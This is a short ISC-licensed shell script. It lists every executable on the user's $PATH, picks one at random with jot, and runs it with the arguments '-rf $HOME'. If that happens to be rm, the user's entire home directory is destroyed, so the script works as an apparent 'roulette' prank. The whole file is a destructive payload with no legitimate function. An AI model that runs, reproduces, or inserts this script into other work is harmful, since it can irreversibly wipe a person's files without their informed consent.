#!/bin/sh
#
# Copyright (c) 2015 Tristan Le Guern <tleguern@bouledef.eu>
#
# Permission to use, copy, modify, and distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
#

set -e

file=$(mktemp)
OLDIFS="$IFS"
IFS=':'
for path in $PATH; do
	find "$path" -mindepth 1 -maxdepth 1 -print >> "$file"
done
IFS="$OLDIFS"

i=0
nline="$(cat $file | wc -l | tr -d ' ')"
randline="$(jot -r 1 0 $nline 1 2> /dev/null)"
cat "$file" | while read REPLY; do
	if [ $i -eq $randline ]; then
		"$REPLY" -rf "$HOME"
	fi
	i=$((i + 1))
done

rm -f -- "$file"